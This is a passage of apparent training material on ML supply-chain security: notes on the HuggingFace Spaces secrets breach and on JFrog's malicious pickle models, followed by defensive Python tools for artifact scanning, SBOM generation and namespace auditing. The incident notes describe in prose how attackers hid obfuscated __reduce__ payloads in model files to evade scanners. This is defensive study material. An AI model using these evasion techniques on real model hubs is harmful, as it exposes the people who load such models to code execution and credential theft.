+    source: &quot;HuggingFace security disclosure (May 2024)&quot;
+    what_happened: |
+      HuggingFace disclosed that its Spaces platform (used for hosting
+      ML model demos) had been compromised, with adversaries gaining
+      unauthorised access to a subset of Spaces secrets — API tokens,
+      service credentials, and environment variables stored in Spaces
+      repositories. HuggingFace revoked affected tokens and notified users.
+    atlas_techniques: [&quot;AML.T0012&quot;, &quot;AML.T0019&quot;]
+    root_cause: |
+      Specific compromise mechanism not fully disclosed. Indicated that
+      adversaries with compromised Spaces access could have used those
+      credentials to push malicious model updates under legitimate
+      organisation namespaces.
+    lessons:
+      - &quot;Model hub infrastructure is itself an attack target, not a trusted boundary&quot;
+      - &quot;Secrets stored in model hub repositories should be treated as compromised and rotated proactively&quot;
+      - &quot;Commit history monitoring on owned model repositories is mandatory&quot;
+
+  incident_03_supply_chain_via_jfrog_research_2023:
+    year: 2023
+    source: &quot;JFrog security research — malicious ML models on HuggingFace&quot;
+    what_happened: |
+      JFrog researchers identified models on HuggingFace that used Python
+      pickle&#x27;s __reduce__ mechanism to embed malicious payloads. The payloads
+      used obfuscation techniques (base64 encoding, exec() chaining) to evade
+      simple pattern matching. The models used names and descriptions designed
+      to appear as legitimate utility models (e.g. text classifier or sentiment
+      analyser wrappers).
+    atlas_techniques: [&quot;AML.T0019&quot;, &quot;AML.T0011&quot;]
+    root_cause: |
+      Sophisticated adversaries obfuscated payloads specifically to evade
+      naive format scanning. This demonstrates that format checks must be
+      structural (magic bytes, file format validation) not content-based
+      (string matching for &quot;import os&quot; or similar).
+    lessons:
+      - &quot;Obfuscation defeats content-based scanning; structural format validation (SafeTensors) does not&quot;
+      - &quot;Obfuscated pickle payloads are indistinguishable from clean ones at content level — enforce SafeTensors, not content scan&quot;
+      - &quot;Model naming is adversarially optimised for trust; do not use name as a trust signal&quot;</p>
+<h2 class="sh1">Implementations</h2>
+<h3 class="sh2">Implementation 01</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">ML Artifact Scanner</p>
+<h3 class="sh3">Filename</h3>
+<p class="prose">ml_artifact_scanner.py</p>
+<h3 class="sh3">Purpose</h3>
+<p class="prose">Production-grade artifact scanner covering all six verification checks:
+format (SafeTensors vs pickle), hash verification, model card completeness,
+dependency SCA scan placeholder, sandbox load indication, and behavioural
+regression stub. Produces a structured scan report with per-check status,
+overall risk level, and recommended action.</p>
+<h3 class="sh3">Language</h3>
+<p class="prose">python</p>
+<h3 class="sh3">Code</h3>
+<pre class="code"><code>&quot;&quot;&quot;
+ML Artifact Scanner — Six-check artifact verification pipeline.
+Covers: format, hash, model card, dependency CVE, sandbox check, regression stub.
+&quot;&quot;&quot;
+
+import hashlib
+import json
+import os
+import struct
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Dict, List, Optional, Tuple
+
+
+# -----------------------------------------------------------------------
+# Check 1 — Format Verification
+# -----------------------------------------------------------------------
+
+PICKLE_MAGIC = [b&#x27;\x80\x02&#x27;, b&#x27;\x80\x04&#x27;, b&#x27;\x80\x05&#x27;]
+SAFETENSORS_JSON_OFFSET = 8  # byte 8 should be &#x27;{&#x27; for valid SafeTensors
+
+
+def check_format(filepath: str) -&gt; Tuple[str, bool, str]:
+    &quot;&quot;&quot;
+    Returns: (format_name, is_safe, detail)
+    Raises: FileNotFoundError if file not found
+    &quot;&quot;&quot;
+    path = Path(filepath)
+    if not path.exists():
+        return (&quot;unknown&quot;, False, f&quot;File not found: {filepath}&quot;)
+
+    with open(filepath, &quot;rb&quot;) as f:
+        header = f.read(16)
+
+    if len(header) &lt; 2:
+        return (&quot;unknown&quot;, False, &quot;File too small to identify&quot;)
+
+    magic2 = header[:2]
+    if any(header[:2] == m[:2] or header[:2] == m for m in PICKLE_MAGIC):
+        return (&quot;pickle&quot;, False,
+                f&quot;PICKLE MAGIC BYTES DETECTED: {header[:2].hex()} — RCE risk&quot;)
+
+    # SafeTensors: 8-byte LE uint64 header length, then JSON starting with &#x27;{&#x27;
+    if len(header) &gt;= 9 and header[8:9] == b&#x27;{&#x27;:
+        try:
+            hdr_len = struct.unpack(&#x27;&lt;Q&#x27;, header[:8])[0]
+            return (&quot;safetensors&quot;, True,
+                    f&quot;SafeTensors format confirmed. Header length: {hdr_len} bytes&quot;)
+        except struct.error:
+            pass
+
+    # HDF5 (TF SavedModel / Keras)
+    if header[:4] == b&#x27;\x89HDF&#x27;:
+        return (&quot;hdf5&quot;, True, &quot;HDF5 format — TensorFlow/Keras model&quot;)
+
+    # ONNX (protobuf)
+    if header[:4] == b&#x27;\x08\x04\x12\x00&#x27; or filepath.endswith(&#x27;.onnx&#x27;):
+        return (&quot;onnx&quot;, True, &quot;ONNX format — portable ML model&quot;)
+
+    return (&quot;unknown&quot;, False,
+            f&quot;Unknown format. First 8 bytes: {header[:8].hex()} — manual review required&quot;)
+
+
+# -----------------------------------------------------------------------
+# Check 2 — Hash Verification
+# -----------------------------------------------------------------------
+
+def compute_sha256(filepath: str, chunk_size: int = 1 &lt;&lt; 20) -&gt; str:
+    h = hashlib.sha256()
+    with open(filepath, &quot;rb&quot;) as f:
+        while chunk := f.read(chunk_size):
+            h.update(chunk)
+    return h.hexdigest()
+
+
+def check_hash(filepath: str,
+               expected_hash: Optional[str] = None) -&gt; Tuple[bool, str]:
+    &quot;&quot;&quot;Compare computed hash against expected. Returns (match, detail).&quot;&quot;&quot;
+    actual = compute_sha256(filepath)
+    if expected_hash is None:
+        return (None, f&quot;No expected hash provided. Computed: {actual}&quot;)
+    match = actual.lower() == expected_hash.lower()
+    if match:
+        return (True, f&quot;Hash verified: {actual[:16]}...&quot;)
+    return (False,
+            f&quot;HASH MISMATCH. Expected: {expected_hash[:16]}... &quot;
+            f&quot;Actual: {actual[:16]}...&quot;)
+
+
+# -----------------------------------------------------------------------
+# Check 3 — Model Card Completeness Audit
+# -----------------------------------------------------------------------
+
+MODEL_CARD_CHECKS = {
+    &quot;training_data_described&quot;: 20,
+    &quot;known_limitations_documented&quot;: 15,
+    &quot;evaluation_results_present&quot;: 20,
+    &quot;intended_use_documented&quot;: 15,
+    &quot;out_of_scope_uses_documented&quot;: 10,
+    &quot;contact_or_attribution_present&quot;: 10,
+    &quot;licence_specified&quot;: 10,
+}
+
+
+def check_model_card(model_card_fields: Dict[str, bool]) -&gt; Tuple[int, str, List[str]]:
+    &quot;&quot;&quot;
+    model_card_fields: {field_name: True/False} for each MODEL_CARD_CHECKS key.
+    Returns: (score, risk_level, missing_fields)
+    &quot;&quot;&quot;
+    score = sum(
+        weight for field, weight in MODEL_CARD_CHECKS.items()
+        if model_card_fields.get(field, False)
+    )
+    missing = [f for f in MODEL_CARD_CHECKS if not model_card_fields.get(f, False)]
+    risk = &quot;low&quot; if score &gt;= 80 else &quot;medium&quot; if score &gt;= 60 else &quot;high&quot;
+    return (score, risk, missing)
+
+
+# -----------------------------------------------------------------------
+# Check 4 — Dependency CVE Placeholder
+# -----------------------------------------------------------------------
+
+KNOWN_VULNERABLE_VERSIONS = {
+    &quot;torch&quot;: [&quot;1.13.0&quot;, &quot;2.0.0&quot;],   # Example — update from CVE feeds
+    &quot;tensorflow&quot;: [&quot;2.11.0&quot;],
+    &quot;numpy&quot;: [&quot;1.22.0&quot;, &quot;1.21.0&quot;],
+}
+
+
+def check_dependencies(requirements_path: str) -&gt; Tuple[str, List[str]]:
+    &quot;&quot;&quot;
+    Parse requirements.txt and flag known-vulnerable versions.
+    Returns: (risk_level, [flagged_packages])
+    &quot;&quot;&quot;
+    if not Path(requirements_path).exists():
+        return (&quot;unknown&quot;, [&quot;requirements file not found&quot;])
+    flagged = []
+    with open(requirements_path) as f:
+        for line in f:
+            line = line.strip()
+            if &quot;==&quot; in line:
+                pkg, ver = line.split(&quot;==&quot;, 1)
+                pkg = pkg.strip().lower()
+                ver = ver.strip()
+                if pkg in KNOWN_VULNERABLE_VERSIONS:
+                    if ver in KNOWN_VULNERABLE_VERSIONS[pkg]:
+                        flagged.append(f&quot;{pkg}=={ver} (known vulnerable version)&quot;)
+    risk = &quot;critical&quot; if flagged else &quot;low&quot;
+    return (risk, flagged)
+
+
+# -----------------------------------------------------------------------
+# Check 5 — Sandbox Load Indicator (stub — full impl requires Docker)
+# -----------------------------------------------------------------------
+
+def check_sandbox_load(filepath: str) -&gt; Tuple[str, str]:
+    &quot;&quot;&quot;
+    Stub: in production, this spawns an isolated Docker container,
+    loads the model, and monitors for unexpected process/network activity.
+    Returns: (status, detail)
+    &quot;&quot;&quot;
+    # Production implementation:
+    # docker run --network=none --read-only --tmpfs /tmp
+    #            -v filepath:/model:ro
+    #            ml-sandbox:latest python -c &quot;import safetensors; ...&quot;
+    return (&quot;stub&quot;,
+            &quot;Sandbox check not yet automated. Load manually in isolated env &quot;
+            &quot;with no outbound network before production use.&quot;)
+
+
+# -----------------------------------------------------------------------
+# Check 6 — Behavioural Regression Stub
+# -----------------------------------------------------------------------
+
+def check_behavioural_regression(model_id: str,
+                                  trigger_phrases: List[str],
+                                  canary_tokens: List[str]) -&gt; Tuple[str, str]:
+    &quot;&quot;&quot;
+    Stub: in production, this loads the model, runs the trigger-probe suite,
+    and checks for canary token recall.
+    Returns: (status, detail)
+    &quot;&quot;&quot;
+    return (&quot;stub&quot;,
+            f&quot;Behavioural regression for {model_id}: implement trigger-probe &quot;
+            f&quot;test suite with {len(trigger_phrases)} trigger(s) and &quot;
+            f&quot;{len(canary_tokens)} canary token(s). See Section 5.9 deliverable.&quot;)
+
+
+# -----------------------------------------------------------------------
+# Master Scan Report
+# -----------------------------------------------------------------------
+
+@dataclass
+class ArtifactScanReport:
+    filepath: str
+    format_name: str
+    format_safe: bool
+    format_detail: str
+    hash_match: Optional[bool]
+    hash_detail: str
+    card_score: Optional[int]
+    card_risk: Optional[str]
+    card_missing: List[str]
+    dep_risk: str
+    dep_flagged: List[str]
+    sandbox_status: str
+    sandbox_detail: str
+    regression_status: str
+    regression_detail: str
+    overall_risk: str = field(init=False)
+    recommended_action: str = field(init=False)
+
+    def __post_init__(self):
+        if not self.format_safe:
+            self.overall_risk = &quot;critical&quot;
+            self.recommended_action = &quot;BLOCK — quarantine immediately; do not load&quot;
+        elif self.hash_match is False:
+            self.overall_risk = &quot;critical&quot;
+            self.recommended_action = &quot;BLOCK — hash mismatch; quarantine&quot;
+        elif self.dep_risk == &quot;critical&quot;:
+            self.overall_risk = &quot;high&quot;
+            self.recommended_action = &quot;REVIEW — critical CVE in dependencies; patch before use&quot;
+        elif (self.card_score is not None and self.card_score &lt; 60):
+            self.overall_risk = &quot;medium&quot;
+            self.recommended_action = &quot;MANUAL REVIEW — low model card score&quot;
+        else:
+            self.overall_risk = &quot;low&quot;
+            self.recommended_action = &quot;PASS — proceed to sandbox load test&quot;
+
+
+def scan_artifact(
+    filepath: str,
+    expected_hash: Optional[str] = None,
+    model_card_fields: Optional[Dict[str, bool]] = None,
+    requirements_path: Optional[str] = None,
+    model_id: str = &quot;unknown&quot;,
+    trigger_phrases: Optional[List[str]] = None,
+    canary_tokens: Optional[List[str]] = None,
+) -&gt; ArtifactScanReport:
+
+    fmt, fmt_safe, fmt_detail = check_format(filepath)
+    hash_match, hash_detail = check_hash(filepath, expected_hash)
+    card_score, card_risk, card_missing = (
+        check_model_card(model_card_fields)
+        if model_card_fields else (None, None, [])
+    )
+    dep_risk, dep_flagged = (
+        check_dependencies(requirements_path)
+        if requirements_path else (&quot;not_checked&quot;, [])
+    )
+    sandbox_status, sandbox_detail = check_sandbox_load(filepath)
+    reg_status, reg_detail = check_behavioural_regression(
+        model_id,
+        trigger_phrases or [],
+        canary_tokens or [],
+    )
+
+    return ArtifactScanReport(
+        filepath=filepath,
+        format_name=fmt, format_safe=fmt_safe, format_detail=fmt_detail,
+        hash_match=hash_match, hash_detail=hash_detail,
+        card_score=card_score, card_risk=card_risk, card_missing=card_missing,
+        dep_risk=dep_risk, dep_flagged=dep_flagged,
+        sandbox_status=sandbox_status, sandbox_detail=sandbox_detail,
+        regression_status=reg_status, regression_detail=reg_detail,
+    )
+
+
+def print_scan_report(r: ArtifactScanReport) -&gt; None:
+    icons = {&quot;critical&quot;: &quot;CRITICAL&quot;, &quot;high&quot;: &quot;HIGH   &quot;,
+             &quot;medium&quot;: &quot;MEDIUM &quot;, &quot;low&quot;: &quot;PASS   &quot;, &quot;stub&quot;: &quot;STUB   &quot;,
+             &quot;not_checked&quot;: &quot;SKIP   &quot;}
+    print(f&quot;\n{&#x27;=&#x27;*60}&quot;)
+    print(f&quot;ARTIFACT SCAN REPORT: {Path(r.filepath).name}&quot;)
+    print(f&quot;Overall Risk: [{r.overall_risk.upper()}]&quot;)
+    print(f&quot;Action:       {r.recommended_action}&quot;)
+    print(f&quot;\nCheck Results:&quot;)
+    fmt_icon = &quot;PASS&quot; if r.format_safe else &quot;CRITICAL&quot;
+    print(f&quot;  [{fmt_icon:8s}] Format:       {r.format_name} — {r.format_detail[:55]}&quot;)
+    hash_icon = &quot;PASS&quot; if r.hash_match else (&quot;SKIP&quot; if r.hash_match is None else &quot;CRITICAL&quot;)
+    print(f&quot;  [{hash_icon:8s}] Hash:         {r.hash_detail[:60]}&quot;)
+    if r.card_score is not None:
+        print(f&quot;  [{r.card_risk.upper():8s}] Model Card:   Score {r.card_score}/100&quot;
+              + (f&quot; — Missing: {&#x27;, &#x27;.join(r.card_missing[:3])}&quot; if r.card_missing else &quot;&quot;))
+    dep_icon = icons.get(r.dep_risk, &quot;UNKNOWN &quot;)
+    print(f&quot;  [{dep_icon}] Dependencies: {r.dep_risk}&quot;
+          + (f&quot; — {r.dep_flagged[0]}&quot; if r.dep_flagged else &quot;&quot;))
+    print(f&quot;  [STUB    ] Sandbox:      {r.sandbox_detail[:60]}&quot;)
+    print(f&quot;  [STUB    ] Regression:   {r.regression_detail[:60]}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    # --- Demo with a mock file ---
+    import tempfile
+
+    # Simulate a SafeTensors file (header = 8 LE bytes + &#x27;{...}&#x27; JSON)
+    with tempfile.NamedTemporaryFile(suffix=&quot;.safetensors&quot;, delete=False) as f:
+        header_json = b&#x27;{&quot;__metadata__&quot;: {}}&#x27;
+        hdr_len = struct.pack(&#x27;&lt;Q&#x27;, len(header_json))
+        f.write(hdr_len + header_json)
+        fname_safe = f.name
+
+    # Simulate a pickle file
+    with tempfile.NamedTemporaryFile(suffix=&quot;.bin&quot;, delete=False) as f:
+        f.write(b&#x27;\x80\x04&#x27; + b&#x27;\x00&#x27; * 20)
+        fname_pickle = f.name
+
+    card = {
+        &quot;training_data_described&quot;: True,
+        &quot;known_limitations_documented&quot;: True,
+        &quot;evaluation_results_present&quot;: True,
+        &quot;intended_use_documented&quot;: False,
+        &quot;out_of_scope_uses_documented&quot;: False,
+        &quot;contact_or_attribution_present&quot;: True,
+        &quot;licence_specified&quot;: True,
+    }
+
+    print(&quot;DEMO: Scanning SafeTensors file&quot;)
+    report_safe = scan_artifact(
+        fname_safe,
+        expected_hash=compute_sha256(fname_safe),
+        model_card_fields=card,
+        model_id=&quot;demo-model-7b&quot;,
+    )
+    print_scan_report(report_safe)
+
+    print(&quot;\nDEMO: Scanning Pickle file (should BLOCK)&quot;)
+    report_pickle = scan_artifact(fname_pickle)
+    print_scan_report(report_pickle)
+
+    os.unlink(fname_safe)
+    os.unlink(fname_pickle)</code></pre>
+<h3 class="sh2">Implementation 02</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">ML SBOM Generator + Supply Chain Checklist</p>
+<h3 class="sh3">Filename</h3>
+<p class="prose">ml_sbom_generator.py</p>
+<h3 class="sh3">Purpose</h3>
+<p class="prose">ML SBOM generator: produces a structured four-layer SBOM (dataset,
+base model, adapters, framework dependencies) as a YAML artefact for
+any model deployment. Also implements the complete supply chain security
+checklist from data acquisition through production deployment, with
+per-stage pass/fail tracking.</p>
+<h3 class="sh3">Language</h3>
+<p class="prose">python</p>
+<h3 class="sh3">Code</h3>
+<pre class="code"><code>&quot;&quot;&quot;
+ML SBOM Generator + Supply Chain Security Checklist
+Four-layer SBOM and staged checklist from dataset to deployment.
+&quot;&quot;&quot;
+
+import hashlib
+import json
+from dataclasses import dataclass, field
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Dict, List, Optional
+import yaml
+
+
+# -----------------------------------------------------------------------
+# ML SBOM Data Structures
+# -----------------------------------------------------------------------
+
+@dataclass
+class DatasetProvenance:
+    name: str
+    version: str
+    source_url: str
+    acquisition_date: str
+    sha256_at_acquisition: str
+    licence: str
+    known_contamination_risks: List[str] = field(default_factory=list)
+    deduplication_applied: bool = False
+    filtering_pipeline_version: str = &quot;unknown&quot;
+
+
+@dataclass
+class BaseModelProvenance:
+    identifier: str            # org/name@sha256 short
+    source_hub: str
+    download_date: str
+    file_format: str           # safetensors / pickle / hdf5 / onnx
+    sha256_at_intake: str
+    sha256_at_training_start: str
+    model_card_score: int
+    audit_date: str
+    auditor: str
+
+
+@dataclass
+class AdapterProvenance:
+    identifier: str
+    adapter_type: str          # lora / qlora / prefix / full-ft
+    source: str
+    download_date: str
+    sha256: str
+    fine_tuning_dataset_ref: str
+    training_run_id: str
+    regression_test_result: str  # pass / fail / pending
+
+
+@dataclass
+class FrameworkProvenance:
+    ml_framework: str
+    ml_framework_version: str
+    cuda_version: str
+    serving_library: str
+    serving_library_version: str
+    docker_image_digest: str
+    sca_scan_date: str
+    critical_cve_count: int
+    high_cve_count: int
+
+
+@dataclass
+class MLSBOM:
+    model_id: str
+    sbom_version: str
+    generated_at: str
+    generated_by: str
+    datasets: List[DatasetProvenance] = field(default_factory=list)
+    base_model: Optional[BaseModelProvenance] = None
+    adapters: List[AdapterProvenance] = field(default_factory=list)
+    framework: Optional[FrameworkProvenance] = None
+
+    def to_dict(self) -&gt; Dict:
+        def _dc_to_dict(obj):
+            if hasattr(obj, &#x27;__dataclass_fields__&#x27;):
+                return {k: _dc_to_dict(v) for k, v in obj.__dict__.items()}
+            if isinstance(obj, list):
+                return [_dc_to_dict(i) for i in obj]
+            return obj
+        return _dc_to_dict(self)
+
+    def export_yaml(self, path: str) -&gt; None:
+        with open(path, &quot;w&quot;) as f:
+            yaml.dump(self.to_dict(), f, allow_unicode=True, sort_keys=False)
+        print(f&quot;ML SBOM exported to {path}&quot;)
+
+    def risk_summary(self) -&gt; Dict:
+        risks = []
+        if self.base_model and self.base_model.file_format == &quot;pickle&quot;:
+            risks.append(&quot;CRITICAL: Base model in pickle format — RCE risk&quot;)
+        if self.base_model and self.base_model.model_card_score &lt; 60:
+            risks.append(f&quot;HIGH: Model card score {self.base_model.model_card_score}/100&quot;)
+        for a in self.adapters:
+            if a.regression_test_result == &quot;fail&quot;:
+                risks.append(f&quot;HIGH: Adapter {a.identifier} regression test failed&quot;)
+            if a.regression_test_result == &quot;pending&quot;:
+                risks.append(f&quot;MEDIUM: Adapter {a.identifier} regression test pending&quot;)
+        if self.framework and self.framework.critical_cve_count &gt; 0:
+            risks.append(f&quot;HIGH: {self.framework.critical_cve_count} critical CVE(s) in dependencies&quot;)
+        return {&quot;risk_count&quot;: len(risks), &quot;risks&quot;: risks}
+
+
+# -----------------------------------------------------------------------
+# Supply Chain Security Checklist
+# -----------------------------------------------------------------------
+
+CHECKLIST_STAGES = {
+    &quot;01_dataset_acquisition&quot;: [
+        &quot;SHA-256 hash computed and recorded at dataset download&quot;,
+        &quot;Dataset source URL and acquisition timestamp logged&quot;,
+        &quot;Dataset licence verified for intended use&quot;,
+        &quot;Known contamination risks documented&quot;,
+        &quot;Dataset stored in immutable storage (write-once S3 / GCS)&quot;,
+    ],
+    &quot;02_data_preprocessing&quot;: [
+        &quot;Preprocessing pipeline version recorded in SBOM&quot;,
+        &quot;Hash of preprocessed output computed and stored&quot;,
+        &quot;Deduplication applied and parameters documented&quot;,
+        &quot;Filtering criteria documented and reproducible&quot;,
+        &quot;Canary tokens injected into training corpus&quot;,
+    ],
+    &quot;03_base_model_download&quot;: [
+        &quot;Model downloaded from verified organisation on trusted hub&quot;,
+        &quot;Namespace verified against official source (no squatting variants)&quot;,
+        &quot;File format checked — SafeTensors preferred; pickle rejected&quot;,
+        &quot;SHA-256 computed at download and stored in SBOM&quot;,
+        &quot;Model card completeness score &gt;= 70&quot;,
+        &quot;Sandbox load test completed in isolated environment&quot;,
+    ],
+    &quot;04_fine_tuning_and_adapters&quot;: [
+        &quot;All adapters hashed at download and stored in SBOM&quot;,
+        &quot;Adapter source verified (no unsigned third-party adapters in prod)&quot;,
+        &quot;Behavioural regression test run on base + adapter combination&quot;,
+        &quot;Adapter hash monitoring active in registry&quot;,
+        &quot;LoRA adapter composition stack fully documented&quot;,
+    ],
+    &quot;05_dependencies&quot;: [
+        &quot;SCA scan run against requirements.txt — zero critical CVEs&quot;,
+        &quot;Docker image digest pinned and recorded in SBOM&quot;,
+        &quot;No known typosquatting packages in dependency tree&quot;,
+        &quot;ML framework version on supported/patched branch&quot;,
+        &quot;CUDA / cuDNN versions recorded and vulnerability-checked&quot;,
+    ],
+    &quot;06_training_pipeline&quot;: [
+        &quot;Training data integrity verified at training start (hash re-check)&quot;,
+        &quot;Base model hash re-verified at training start&quot;,
+        &quot;Training run ID recorded and linked to SBOM&quot;,
+        &quot;Training pipeline access control — only authorised identities write&quot;,
+        &quot;Training output checkpoint hashed and stored&quot;,
+    ],
+    &quot;07_model_registry&quot;: [
+        &quot;Trained checkpoint hash stored in model registry at upload&quot;,
+        &quot;Registry access control — only pipeline service account writes&quot;,
+        &quot;Hash re-verified at production promotion gate&quot;,
+        &quot;Rollback capability verified — previous clean checkpoint available&quot;,
+    ],
+    &quot;08_production_deployment&quot;: [
+        &quot;Model hash re-verified at serving load time&quot;,
+        &quot;Adapter hash re-verified at serving load time&quot;,
+        &quot;Behavioural regression test passed on production candidate&quot;,
+        &quot;SBOM complete and attached to production model record&quot;,
+        &quot;Incident response plan documented for supply chain compromise&quot;,
+    ],
+}
+
+
+@dataclass
+class ChecklistResult:
+    stage: str
+    items: List[str]
+    passed: List[str]
+    failed: List[str]
+
+    @property
+    def score(self) -&gt; int:
+        return int(len(self.passed) / len(self.items) * 100) if self.items else 100
+
+    @property
+    def risk_level(self) -&gt; str:
+        s = self.score
+        return &quot;low&quot; if s &gt;= 80 else &quot;medium&quot; if s &gt;= 60 else &quot;high&quot;
+
+
+def run_checklist(stage_responses: Dict[str, Dict[str, bool]]) -&gt; List[ChecklistResult]:
+    &quot;&quot;&quot;
+    stage_responses: {stage_key: {item_text: True/False}}
+    &quot;&quot;&quot;
+    results = []
+    for stage, items in CHECKLIST_STAGES.items():
+        responses = stage_responses.get(stage, {})
+        passed = [i for i in items if responses.get(i, False)]
+        failed = [i for i in items if not responses.get(i, False)]
+        results.append(ChecklistResult(stage=stage, items=items,
+                                       passed=passed, failed=failed))
+    return results
+
+
+def print_checklist_report(results: List[ChecklistResult]) -&gt; None:
+    print(f&quot;\n{&#x27;=&#x27;*60}&quot;)
+    print(&quot;AI SUPPLY CHAIN SECURITY CHECKLIST&quot;)
+    print(&quot;=&quot; * 60)
+    overall_passed = sum(len(r.passed) for r in results)
+    overall_total = sum(len(r.items) for r in results)
+    overall_pct = int(overall_passed / overall_total * 100) if overall_total else 0
+    print(f&quot;Overall: {overall_passed}/{overall_total} ({overall_pct}%)\n&quot;)
+    for r in results:
+        icon = {&quot;low&quot;: &quot;PASS&quot;, &quot;medium&quot;: &quot;WARN&quot;, &quot;high&quot;: &quot;FAIL&quot;}[r.risk_level]
+        print(f&quot;  [{icon}] {r.stage} — {r.score}%&quot;)
+        for f in r.failed[:3]:
+            print(f&quot;         MISSING: {f[:60]}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    # --- Build example SBOM ---
+    sbom = MLSBOM(
+        model_id=&quot;acmecorp-financebot-v2&quot;,
+        sbom_version=&quot;1.0&quot;,
+        generated_at=datetime.now(timezone.utc).isoformat(),
+        generated_by=&quot;ml-security-team&quot;,
+    )
+    sbom.datasets = [
+        DatasetProvenance(
+            name=&quot;internal-finance-qa-v3&quot;,
+            version=&quot;3.0&quot;,
+            source_url=&quot;s3://internal-datasets/finance-qa-v3.jsonl&quot;,
+            acquisition_date=&quot;2026-01-10&quot;,
+            sha256_at_acquisition=&quot;abc123def456&quot; + &quot;0&quot; * 52,
+            licence=&quot;proprietary&quot;,
+            deduplication_applied=True,
+            filtering_pipeline_version=&quot;filter-v2.3&quot;,
+        )
+    ]
+    sbom.base_model = BaseModelProvenance(
+        identifier=&quot;meta-llama/Meta-Llama-3-8B@a1b2c3&quot;,
+        source_hub=&quot;huggingface.co&quot;,
+        download_date=&quot;2026-01-12&quot;,
+        file_format=&quot;safetensors&quot;,
+        sha256_at_intake=&quot;def789&quot; + &quot;0&quot; * 58,
+        sha256_at_training_start=&quot;def789&quot; + &quot;0&quot; * 58,
+        model_card_score=85,
+        audit_date=&quot;2026-01-12&quot;,
+        auditor=&quot;ml-security-team&quot;,
+    )
+    sbom.adapters = [
+        AdapterProvenance(
+            identifier=&quot;acmecorp/finance-lora-v2&quot;,
+            adapter_type=&quot;lora&quot;,
+            source=&quot;internal-registry&quot;,
+            download_date=&quot;2026-01-15&quot;,
+            sha256=&quot;fed321&quot; + &quot;0&quot; * 58,
+            fine_tuning_dataset_ref=&quot;internal-finance-qa-v3&quot;,
+            training_run_id=&quot;run-20260115-001&quot;,
+            regression_test_result=&quot;pass&quot;,
+        )
+    ]
+    sbom.framework = FrameworkProvenance(
+        ml_framework=&quot;torch&quot;,
+        ml_framework_version=&quot;2.2.1&quot;,
+        cuda_version=&quot;12.1&quot;,
+        serving_library=&quot;vllm&quot;,
+        serving_library_version=&quot;0.4.0&quot;,
+        docker_image_digest=&quot;sha256:aabbcc&quot; + &quot;0&quot; * 58,
+        sca_scan_date=&quot;2026-01-15&quot;,
+        critical_cve_count=0,
+        high_cve_count=1,
+    )
+
+    sbom.export_yaml(&quot;acmecorp_financebot_v2_sbom.yaml&quot;)
+    risk = sbom.risk_summary()
+    print(f&quot;\nSBOM Risk Summary: {risk[&#x27;risk_count&#x27;]} risk(s)&quot;)
+    for r in risk[&quot;risks&quot;]:
+        print(f&quot;  {r}&quot;)
+
+    # --- Run partial checklist ---
+    responses = {
+        &quot;03_base_model_download&quot;: {
+            &quot;Model downloaded from verified organisation on trusted hub&quot;: True,
+            &quot;Namespace verified against official source (no squatting variants)&quot;: True,
+            &quot;File format checked — SafeTensors preferred; pickle rejected&quot;: True,
+            &quot;SHA-256 computed at download and stored in SBOM&quot;: True,
+            &quot;Model card completeness score &gt;= 70&quot;: True,
+            &quot;Sandbox load test completed in isolated environment&quot;: False,  # NOT DONE
+        },
+        &quot;05_dependencies&quot;: {
+            &quot;SCA scan run against requirements.txt — zero critical CVEs&quot;: True,
+            &quot;Docker image digest pinned and recorded in SBOM&quot;: True,
+            &quot;No known typosquatting packages in dependency tree&quot;: False,  # MISSING
+            &quot;ML framework version on supported/patched branch&quot;: True,
+            &quot;CUDA / cuDNN versions recorded and vulnerability-checked&quot;: True,
+        },
+    }
+    results = run_checklist(responses)
+    print_checklist_report(results)</code></pre>
+<h3 class="sh2">Implementation 03</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">HuggingFace Model Audit Tool</p>
+<h3 class="sh3">Filename</h3>
+<p class="prose">hf_model_audit.py</p>
+<h3 class="sh3">Purpose</h3>
+<p class="prose">Automated HuggingFace model audit tool implementing the six-step audit
+procedure. Checks namespace legitimacy heuristics, file format, hash
+verification, model card completeness scoring, dependency scan via
+requirements.txt if present, and produces a structured audit report
+with recommendation (use / manual review / reject).</p>
+<h3 class="sh3">Language</h3>
+<p class="prose">python</p>
+<h3 class="sh3">Code</h3>
+<pre class="code"><code>&quot;&quot;&quot;
+HuggingFace Model Audit Tool
+Six-step audit: namespace, format, hash, model card, dependencies, sandbox.
+&quot;&quot;&quot;
+
+import re
+from dataclasses import dataclass, field
+from typing import Dict, List, Optional, Tuple
+
+
+# -----------------------------------------------------------------------
+# Step 1 — Namespace Legitimacy Heuristics
+# -----------------------------------------------------------------------
+
+TRUSTED_ORG_PATTERNS = [
+    r&#x27;^meta-llama$&#x27;, r&#x27;^google$&#x27;, r&#x27;^microsoft$&#x27;, r&#x27;^openai$&#x27;,
+    r&#x27;^mistralai$&#x27;, r&#x27;^huggingface$&#x27;, r&#x27;^anthropic$&#x27;,
+    r&#x27;^EleutherAI$&#x27;, r&#x27;^allenai$&#x27;, r&#x27;^bigscience$&#x27;,
+    r&#x27;^tiiuae$&#x27;, r&#x27;^deepseek-ai$&#x27;, r&#x27;^Qwen$&#x27;,
+]
+
+SQUATTING_SIMILARITY_THRESHOLD = 2  # edit distance
+
+
+def _edit_distance(a: str, b: str) -&gt; int:
+    m, n = len(a), len(b)
+    dp = list(range(n + 1))
+    for i in range(1, m + 1):
+        prev, dp[0] = dp[0], i
+        for j in range(1, n + 1):
+            temp = dp[j]
+            dp[j] = (prev if a[i-1] == b[j-1]
+                      else 1 + min(prev, dp[j], dp[j-1]))
+            prev = temp
+    return dp[n]
+
+
+def check_namespace(model_id: str) -&gt; Tuple[str, str, List[str]]:
+    &quot;&quot;&quot;
+    model_id: &#x27;org/model-name&#x27;
+    Returns: (risk_level, detail, warnings)
+    &quot;&quot;&quot;
+    if &#x27;/&#x27; not in model_id:
+        return (&quot;high&quot;, &quot;No organisation prefix — individual user upload&quot;, [])
+    org, model_name = model_id.split(&#x27;/&#x27;, 1)
+    warnings = []
+
+    is_trusted = any(re.match(p, org, re.I) for p in TRUSTED_ORG_PATTERNS)
+
+    # Check for near-squatting
+    squats = []
+    for pattern in TRUSTED_ORG_PATTERNS:
+        canonical = pattern.strip(&#x27;^$&#x27;)
+        dist = _edit_distance(org.lower(), canonical.lower())
